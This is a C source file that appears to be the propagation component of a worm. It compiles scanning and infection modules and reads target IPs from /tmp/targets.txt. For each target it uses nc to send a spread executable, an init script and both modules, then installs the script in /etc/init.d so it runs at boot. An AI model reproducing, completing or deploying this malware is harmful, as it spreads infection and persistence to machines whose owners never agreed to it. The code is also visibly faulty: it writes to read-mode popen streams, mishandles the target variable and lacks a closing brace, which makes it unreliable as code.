#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main () 
{
    FILE *compscan;
    FILE *compinfect;
    FILE *runscan;
    FILE *connect;
    FILE *linecount;
    FILE *copyvar;

    int transmit1;
    int transmit2;
    int transmit3;
    char *line = NULL;
    size_t len = 0;
    ssize_t nread;
  

    //compile infect.c
    compinfect = popen("gcc infect.c -o infect", "r");
    fclose(compinfect); 
    
    //compile and run scan.c
    compscan = popen("gcc scan.c -o scan", "r");
    if (compscan != NULL)
    {
        runscan = popen("./scan", "r");
        fclose(runscan);
    }
    fclose(compscan); 



    linecount = fopen("/tmp/targets.txt", "r");
    if (linecount == NULL) {
        perror("fopen");
        return (1);
    }
    //while loop to iterate through target file
    while ((nread = getline(&line, &len, linecount)) != -1) 
    {
        //Store target IP in shell variable '$var'
        copyvar = popen("var=$(</tmp/targets.txt)", "r");
        if (copyvar == NULL)
        {
            printf("no var info");
            return(1);
        }
        //attempt ncat connection
        fprintf(copyvar, "nc $var 9290 < /Downloads/spread.o"); //transfer spread executable
        fprintf(copyvar, "nc $var 9290 < /Downloads/initspread.sh"); //transfer init script
        fprintf(copyvar, "nc $var 9290 < /Downloads/scan.c"); //transfer target identification module
        fprintf(copyvar, "nc $var 9290 < /Downloads/infect.c"); //transfer infection module
        fprintf(copyvar, "mv /Downloads/initspread.sh /etc/init.d/initspread.sh"); //place spread.c into init.d to run on bootup
        fprintf(copyvar, "chmod +x /etc/init.d/initspread.sh"); //give spread.c permissions
        fprintf(copyvar, "update-rc.d /etc/init.d/initspread.sh"); //give spread.c permissions
        fclose(copyvar);
        fwrite(line, nread, 1, stdout);
    }
    free(line);
    fclose(linecount);
   

    

    
    

    
    return(0);
